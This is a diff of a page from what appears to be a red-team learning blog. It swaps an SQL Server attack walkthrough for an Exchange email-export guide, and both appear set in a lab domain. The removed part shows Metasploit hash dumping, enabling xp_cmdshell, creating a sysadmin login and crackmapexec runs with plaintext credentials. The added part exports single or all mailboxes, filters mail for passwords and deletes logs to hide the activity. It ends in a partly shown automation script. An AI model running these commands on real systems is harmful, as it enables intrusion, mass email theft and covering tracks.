@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Sqlserver common attack methods, Yangsir">
+    <meta name="keywords" content="Exchange Export email methods, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Sqlserver common attack methods | Yangsir</title>
+    <title>Exchange Export email methods | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132256320.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Sqlserver common attack methods</h1>
+                    <h1 class="description center-align post-title">Exchange Export email methods</h1>
                 </div>
             </div>
         </div>
@@ -436,20 +436,12 @@
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
+                            <a href="/tags/Exchange/">
+                                <span class="chip bg-color">Exchange</span>
+                            </a>
+                        
                             <a href="/tags/Information-collection/">
                                 <span class="chip bg-color">Information collection</span>
-                            </a>
-                        
-                            <a href="/tags/Sqlserver/">
-                                <span class="chip bg-color">Sqlserver</span>
-                            </a>
-                        
-                            <a href="/tags/Database/">
-                                <span class="chip bg-color">Database</span>
-                            </a>
-                        
-                            <a href="/tags/Command-execution/">
-                                <span class="chip bg-color">Command execution</span>
                             </a>
                         
                     </div>
@@ -460,8 +452,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Miscellaneous-record/" class="post-category">
-                                Miscellaneous record
+                            <a href="/categories/Learning-record/" class="post-category">
+                                Learning record
                             </a>
                         
                     </div>
@@ -473,28 +465,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-24
+                    2021-07-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-07-24
+                    2021-07-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.3k
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    8 Min
+                    6 Min
                 </div>
                 
 
@@ -517,200 +509,262 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Default port 1433, NMAP fingerprint is as follows:
-PORT     STATE SERVICE  VERSION
-1433&#x2F;tcp open  ms-sql-s Microsoft SQL Server 2012 11.00.2100.00; RTM
-| ms-sql-ntlm-info:
-|   Target_Name: ROOTKIT
-|   NetBIOS_Domain_Name: ROOTKIT
-|   NetBIOS_Computer_Name: SRV-WEB-KIT
-|   DNS_Domain_Name: rootkit.org
-|   DNS_Computer_Name: Srv-Web-Kit.rootkit.org
-|   DNS_Tree_Name: rootkit.org
-|_  Product_Version: 6.3.9600
-Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows
+                <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Assuming that you have obtained the administrative rights of the Exchange server, what you need to do now is to search and export the emails in the server, so as to obtain more critical and sensitive information, such as looking for passwords and personal information<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Host script results:
-| ms-sql-info:
-|   192.168.3.73:1433:
-|     Version:
-|       name: Microsoft SQL Server 2012 RTM
-|       number: 11.00.2100.00
-|       Product: Microsoft SQL Server 2012
-|       Service pack level: RTM
-|       Post-SP patches applied: false
-|_    TCP port: 1433<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Basic-information-Acquisition"><a href="#Basic-information-Acquisition" class="headerlink" title="Basic information Acquisition"></a>Basic information Acquisition</h2><pre class="line-numbers language-none"><code class="language-none">Get your tar account
 
-<h3 id="The-system-tables"><a href="#The-system-tables" class="headerlink" title="The system tables"></a>The system tables</h3><pre class="line-numbers language-none"><code class="language-none">Master: Records all system-level information
+Get-MailboxStatistics -Identity yangsir |fl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-Model: Template database, such as for database size, collation, recovery model, and other database options, will be used for any database that is later created
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png"></p>
+<h2 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h2><h3 id="PSSession"><a href="#PSSession" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;rootkit.org\administrator&quot;
+$Pass &#x3D; ConvertTo-SecureString -AsPlainText admin!@#45 -Force
+$Credential &#x3D; New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
+$Session &#x3D; New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http:&#x2F;&#x2F;OWA2013&#x2F;PowerShell&#x2F; -Authentication Kerberos -Credential $Credential
+Import-PSSession $Session -AllowClobber<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-MSDB: Arrange alarm and operation
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.35.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">session address must be fqdn, if not fqdn will wrong like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Tempdb: Space to hold temporary objects or intermediate result sets
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.39.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">get pssession info：
+Get-PSSession
 
-Resouce: read-only, containing the attached system objects that are physically persistent in the resource database and appear in sys mode for each database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+stop PSSession：
+Remove-PSSession $Session
 
-<h3 id="Grammar-supplement"><a href="#Grammar-supplement" class="headerlink" title="Grammar supplement"></a>Grammar supplement</h3><pre class="line-numbers language-none"><code class="language-none">View all databases
-SELECT Name FROM Master.. SysDatabases ORDER BY Name
-SELECT name FROM master.dbo.sysdatabases
+get account：
+Get-Mailbox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-View the name of the table
-SELECT * FROM #databaseName#.INFORMATION_SCHEMA.TABLES;
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.46.png"></p>
+<h3 id="Use-exchange"><a href="#Use-exchange" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">add the manager unit
+Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-View service links
-EXEC sp_linkedservers
-SELECT * FROM sys.servers;
+<h4 id="MSDN-info"><a href="#MSDN-info" class="headerlink" title="MSDN info"></a>MSDN info</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;powershell&#x2F;module&#x2F;exchange&#x2F;?view&#x3D;exchange-ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-To view the user
-select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled &#x3D; 1 then &#39;Disabled&#39; else &#39;Enabled&#39; end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id &#x3D; sl.principal_id where sp.type not in (&#39;G&#39;, &#39;R&#39;) order by sp.name;
+<h4 id="Get-all-account"><a href="#Get-all-account" class="headerlink" title="Get all account"></a>Get all account</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.50.png"></p>
+<h4 id="Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox"><a href="#Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox" class="headerlink" title="Get all mailbox information, including the number of messages, the last time to access the mailbox"></a>Get all mailbox information, including the number of messages, the last time to access the mailbox</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.58.png"></p>
+<h4 id="Get-all-ou"><a href="#Get-all-ou" class="headerlink" title="Get all ou"></a>Get all ou</h4><pre class="line-numbers language-none"><code class="language-none">Get-OrganizationalUnit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Create a user
-CREATE LOGIN yangsir WITH PASSWORD &#x3D; &#39;Yangsirnb123&#39;
-sp_addsrvrolemember &#39;yangsir&#39;, &#39;sysadmin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.07.png"></p>
+<h4 id="Get-the-follow-log"><a href="#Get-the-follow-log" class="headerlink" title="Get the follow log"></a>Get the follow log</h4><pre class="line-numbers language-none"><code class="language-none">system dir 
+%ExchangeInstallPath%TransportRoles\Logs\MessageTracking<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Information-collection"><a href="#Information-collection" class="headerlink" title="Information collection"></a>Information collection</h3><h4 id="use-admin-mssql-mssql-enum-domain-accounts-about-domain-account"><a href="#use-admin-mssql-mssql-enum-domain-accounts-about-domain-account" class="headerlink" title="use admin/mssql/mssql_enum_domain_accounts about domain account"></a>use admin/mssql/mssql_enum_domain_accounts about domain account</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_domain_accounts) &gt; run
-[*] Running module against 192.168.3.73
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.13.png"></p>
+<h4 id="Gets-the-sender-information-of-the-specified-sender"><a href="#Gets-the-sender-information-of-the-specified-sender" class="headerlink" title="Gets the sender information of the specified sender"></a>Gets the sender information of the specified sender</h4><pre class="line-numbers language-none"><code class="language-none">See yangsir@rootkit.org for information about all emails sent from 18:00, 28 July 2021 to present
 
-[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...
-[+] 192.168.3.73:1433 - Connected.
-[*] 192.168.3.73:1433 - SQL Server Name: SRV-WEB-KIT
-[*] 192.168.3.73:1433 - Domain Name: ROOTKIT
-[+] 192.168.3.73:1433 - Found the domain sid: 010500000000000515000000e23e1be0b3ff69b2200c3dd5
-[*] 192.168.3.73:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
-[*] 192.168.3.73:1433 -  - ROOTKIT\Administrator
-[*] 192.168.3.73:1433 -  - ROOTKIT\Guest
-[*] 192.168.3.73:1433 -  - ROOTKIT\krbtgt
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Admins
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Users
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Guests
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Computers
-[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Controllers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Get-MessageTrackingLog -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="use-admin-mssql-mssql-enum-sql-logins-about-login-user"><a href="#use-admin-mssql-mssql-enum-sql-logins-about-login-user" class="headerlink" title="use admin/mssql/mssql_enum_sql_logins about login user"></a>use admin/mssql/mssql_enum_sql_logins about login user</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_sql_logins) &gt; run
-[*] Running module against 192.168.3.73
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.18.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">same way to the example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...
-[+] 192.168.3.73:1433 - Connected.
-[*] 192.168.3.73:1433 - Checking if sa has the sysadmin role...
-[+] 192.168.3.73:1433 - sa is a sysadmin.
-[*] 192.168.3.73:1433 - Setup to fuzz 300 SQL Server logins.
-[*] 192.168.3.73:1433 - Enumerating logins...
-[+] 192.168.3.73:1433 - 35 initial SQL Server logins were found.
-[*] 192.168.3.73:1433 - Verifying the SQL Server logins...
-[+] 192.168.3.73:1433 - 10 SQL Server logins were verified:
-[*] 192.168.3.73:1433 -  - ##MS_PolicyEventProcessingLogin##
-[*] 192.168.3.73:1433 -  - ##MS_PolicyTsqlExecutionLogin##
-[*] 192.168.3.73:1433 -  - NT AUTHORITY\SYSTEM
-[*] 192.168.3.73:1433 -  - NT SERVICE\MSSQLSERVER
-[*] 192.168.3.73:1433 -  - NT SERVICE\SQLSERVERAGENT
-[*] 192.168.3.73:1433 -  - NT SERVICE\SQLWriter
-[*] 192.168.3.73:1433 -  - NT SERVICE\Winmgmt
-[*] 192.168.3.73:1433 -  - ROOTKIT\dbadmin
-[*] 192.168.3.73:1433 -  - ROOTKIT\sqladmin
-[*] 192.168.3.73:1433 -  - sa
-[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.21.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Get more easy info
 
-<h4 id="use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data"><a href="#use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data" class="headerlink" title="use auxiliary/admin/mssql/mssql_findandsampledata some interest data"></a>use auxiliary/admin/mssql/mssql_findandsampledata some interest data</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_findandsampledata) &gt; run
+Get-MessageTrackingLog -EventID send -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-[*] 192.168.3.73:1433     - Attempting to connect to the SQL Server at 192.168.3.73:1433...
-[+] 192.168.3.73:1433     - Successfully connected to 192.168.3.73:1433
-[*] 192.168.3.73:1433     - Attempting to retrieve data ...
-[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , Sys_User                      , PassWord                      , nvarchar                      , cfcd208495d565ef66e7dff9f98764, 5
-[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WC_Forum_User                 , PasswordType                  , int                           , 1                             , 1
-[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WM_Users                      , Password                      , nvarchar                      , 123                           , 7
-[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.25.png"></p>
+<h2 id="Export"><a href="#Export" class="headerlink" title="Export"></a>Export</h2><h3 id="PSSession-1"><a href="#PSSession-1" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">Need connection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="use-auxiliary-scanner-mssql-mssql-hashdump-get-password"><a href="#use-auxiliary-scanner-mssql-mssql-hashdump-get-password" class="headerlink" title="use auxiliary/scanner/mssql/mssql_hashdump  get password"></a>use auxiliary/scanner/mssql/mssql_hashdump  get password</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(scanner&#x2F;mssql&#x2F;mssql_hashdump) &gt; run
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.30.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Adds the current user to the Mailbox Import Expor role group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-[*] 192.168.3.73:1433     - Instance Name: nil
-[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; sa:020008da5345d7acb57f6e081ab60b39cdd31a939c06d3ad751fa9fcdad7d17d864013f33f6bf013dd74e2559a2b82deb5776167ce4db13632b9d43ca62b17d335320f1e2399
-[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyEventProcessingLogin##:0200ce4fb17bbcb091201639a75dfef7681df56c695e199076214dfee2308db01792cb4266d9e650aeb823d694359f9b32b4250954ae0c399a7f59b33ca68eaa9c43a173adf4
-[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyTsqlExecutionLogin##:0200400c2a7a6af4d09e573e8a6ef82c3d171d3d77103df288f079c35b012b94e8bb6b8c26b6902cd0a3f37419bdab1fb8f83c1d0536e4bd374785c6623907139b1102e9f681
-[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.33.png"></p>
+<h4 id="Export-special-user"><a href="#Export-special-user" class="headerlink" title="Export  special user"></a>Export  special user</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;
+New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)
 
-<h3 id="Elevated-privileges"><a href="#Elevated-privileges" class="headerlink" title="Elevated privileges"></a>Elevated privileges</h3><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_escalate_execute_as need IMPERSONATION 
-use admin&#x2F;mssql&#x2F;mssql_escalate_dbowner need dbowner<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+this way to export the daochu dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command execution"></a>Command execution</h3><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_exec 
-use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_payload
-use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler 
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.39.png"></p>
+<h4 id="Export-the-key-from-email"><a href="#Export-the-key-from-email" class="headerlink" title="Export the key from email"></a>Export the key from email</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;
+New-MailboxexportRequest -mailbox $User -ContentFilter &#123;(body -like &quot;*pass*&quot;)&#125; -FilePath (&quot;\\localhost\c$\daochu1\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_exec) &gt; run
-[*] Running module against 192.168.3.73
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.00.png"></p>
+<h4 id="Export-all-email"><a href="#Export-all-email" class="headerlink" title="Export all email"></a>Export all email</h4><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%&#123;New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\localhost\c$\all\&quot;+($_.name)+&quot;.pst&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-[*] 192.168.3.73:1433 - The server may have xp_cmdshell disabled, trying to enable it...
-[*] 192.168.3.73:1433 - SQL Query: EXEC master..xp_cmdshell &#39;whoami&#39;
+<h4 id="Export-log"><a href="#Export-log" class="headerlink" title="Export log"></a>Export log</h4><pre class="line-numbers language-none"><code class="language-none">get log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
- output
- ------
- rootkit\dbadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.04.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">you can use this way to not make log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h4 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h4><pre class="line-numbers language-none"><code class="language-none">crackmapexec mssql 192.168.3.73 -d rootkit.org -u sqladmin -p Admin12345 -x &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.08.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">del all log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132256320.png"></p>
-<h4 id="use-xpcmdshell"><a href="#use-xpcmdshell" class="headerlink" title="use xpcmdshell"></a>use xpcmdshell</h4><pre class="line-numbers language-none"><code class="language-none">open xpcmdshell
-sp_configure &#39;show advanced options&#39;, &#39;1&#39;
-RECONFIGURE
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.12.png"></p>
+<h4 id="PS-AUTO"><a href="#PS-AUTO" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">follow <span class="token keyword">from</span> 3gstudent 
 
-sp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;
-RECONFIGURE
+<span class="token keyword">function</span> UsePSSessionToExportMailfromExchange
+<span class="token punctuation">&#123;</span>
+<span class="token comment">#Requires -Version 2.0</span>
+<span class="token comment">&lt;#
+.SYNOPSIS
+This script will export the mail(.pst) from the Exchange server.
+First it will use PSSession to connect the Exchange server.
+Then it'll check the user's privilege.
+If the user is not in the "Mailbox Import Export",the script will add the user to it and reconnect the Exchange server.
+Next it will export the mail and save it.
+At last it will remove the user from the group and remove the PSSession.
+Author: 3gstudent
+.PARAMETER User
+The user to use.
+In general, you can choose the account in the domain admins.
+.PARAMETER Password
+The password of the user.
+.PARAMETER MailBox
+The mail you want to export.
+.PARAMETER ExportPath
+The export path of the mail.
+.PARAMETER ConnectionUri
+The uri of the Exchange server.
+Eg.
+    http://Exchange01.test.com/PowerShell/
+    
+.PARAMETER $Filter
+The search filter of the mail.
+.EXAMPLE
+PS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;"
+#></span>
+ 	<span class="token keyword">param</span> <span class="token punctuation">(</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$User</span><span class="token punctuation">,</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">,</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$ConnectionUri</span><span class="token punctuation">,</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$Filter</span>
+	<span class="token punctuation">)</span>
+    <span class="token variable">$Flag</span> = 0
+    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Import-PSSession"</span> 
+    <span class="token comment">#Import-PSSession</span>
+    <span class="token variable">$Pass</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token operator">-</span>AsPlainText <span class="token variable">$Password</span> <span class="token operator">-</span>Force
+    <span class="token variable">$Credential</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token operator">-</span>ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span><span class="token variable">$Pass</span>
+    <span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>
+    <span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>
 
-then use these
-EXEC master..xp_cmdshell &#39;whoami&#39;
-EXEC xp_cmdshell &quot;whoami&quot;;
-EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to check user"</span>
+    <span class="token comment">#check user</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token operator">-</span>ErrorAction SilentlyContinue<span class="token punctuation">)</span> 
+    <span class="token punctuation">&#123;</span>
+    	<span class="token function">Write-Host</span> <span class="token string">"[!] The specified user already exists.No need to add it to the group"</span>
+	<span class="token variable">$Flag</span> = 1
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+    	<span class="token function">Write-Host</span> <span class="token string">"[+] Start to add user"</span> 
+    	<span class="token comment">#Add user</span>
+    	<span class="token function">New-ManagementRoleAssignment</span> –Role <span class="token string">"Mailbox Import Export"</span> –User <span class="token variable">$User</span><span class="token punctuation">|</span> <span class="token function">Out-Null</span>
+    	<span class="token function">Write-Host</span> <span class="token string">"[>] Start to reconnect"</span>
+    	<span class="token comment">#Reconnect</span>
+    	<span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>
